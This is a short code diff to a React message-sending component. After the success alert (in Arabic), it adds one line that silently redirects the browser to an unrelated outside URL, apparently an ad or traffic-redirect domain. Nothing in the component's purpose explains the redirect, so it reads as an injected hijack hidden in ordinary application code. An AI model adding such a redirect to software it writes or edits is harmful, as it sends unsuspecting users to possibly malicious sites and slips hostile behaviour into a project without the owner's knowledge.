@@ -38,6 +38,7 @@ const SendMessage: React.FC<SendMessageProps> = ({ user }) => {
         setError(null);
         setContent('');
         showAlertMessage('تم إرسال الرسالة بنجاح');
+        window.location.href = 'https://phaurtuh.net/4/4327150';
       })
       .catch(err => {
         console.dir(err);
